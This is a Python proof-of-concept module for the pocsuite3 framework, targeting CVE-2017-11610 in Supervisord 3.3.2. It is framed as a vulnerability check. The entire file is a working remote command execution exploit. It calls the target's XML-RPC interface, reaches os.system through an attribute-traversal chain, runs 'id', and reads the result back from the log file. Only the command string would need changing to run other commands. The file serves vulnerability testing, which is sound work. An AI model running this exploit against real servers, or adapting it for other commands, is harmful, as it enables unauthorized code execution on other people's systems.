#!/usr/bin/env python
# coding: utf-8
import os
import sys
import xmlrpc.client
import subprocess
from urllib.parse import urlparse
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class TestPOC(POCBase):
    vulID = '0'
    version = '1.0'
    author = 'kcat'
    vulDate = '2020-2-20'
    createDate = '2020-2-20'
    updateDate = '2020-2-20'
    references = ['https://github.com/vulhub/vulhub/tree/master/supervisor/CVE-2017-11610']
    name = 'Supervisord 远程命令执行漏洞'
    appPowerLink = ''
    appName = 'Supervisord'
    appVersion = '3.3.2'
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = '''
    利用 https://github.com/vulhub/vulhub/tree/master/supervisor/CVE-2017-11610 中的'poc.py'来检测是否存在漏洞
    '''

    def _verify(self):
        result = {}
        pr = urlparse(self.url)
        target = "{0}://{1}:{2}/RPC2".format(pr.scheme, pr.hostname, str(pr.port))
        command = 'id'
        try:
            with xmlrpc.client.ServerProxy(target) as proxy:
                old = getattr(proxy, 'supervisor.readLog')(0,0)

                logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
                getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile))
                result_ = getattr(proxy, 'supervisor.readLog')(0,0)
                msg = (result_[len(old):])
            if 'uid' in msg:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['extra'] = {}
                result['extra']['command'] =  'id'
                result['extra']['evidence'] =  msg
        except:
            pass

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output


register_poc(TestPOC)
